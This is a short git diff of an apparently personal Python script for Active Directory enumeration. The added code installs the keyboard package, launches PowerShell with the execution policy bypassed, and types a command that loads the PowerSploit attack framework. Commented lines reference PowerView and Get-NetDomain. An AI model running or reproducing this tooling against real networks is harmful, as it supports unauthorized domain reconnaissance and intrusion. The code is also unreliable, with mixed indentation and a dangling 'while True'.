@@ -1,6 +1,7 @@
 import subprocess
 import ipaddress
 import os
+import keyboard
 
 #I want to get powerview from server first
 
@@ -53,15 +54,22 @@ class enumerate():
 		self.psm1.close()
 		self.ps1.close()
 
-
+	def ps1_exec(self):
+        subprocess.run('pip install keyboard',shell=True)
+		self.powershell_cmd = r'powershell -ep Bypass'
+		self.powershell = subprocess.run(self.powershell_cmd,shell=True)
+		keyboard.write('. .\\PowerSploit.ps1')
+		
+		# self.powersploit_cmd = '. .\\PowerSploit.ps1'
+		# self.powersploit = subprocess.run(self.powersploit_cmd,shell=False)
+		# self.testcmd = 'Get-NetDomain'
+		# self.test = subprocess.run(self.testcmd,shell=False)
 
 
 server = ip_address()
 link = curl_data()
-#link.down_data(server)
-#link.extract_data()
-enum = enumerate(abx)
+enum = enumerate()
 enum.change_dir()
 enum.psm_ps()
+enum.ps1_exec()
 
-while True
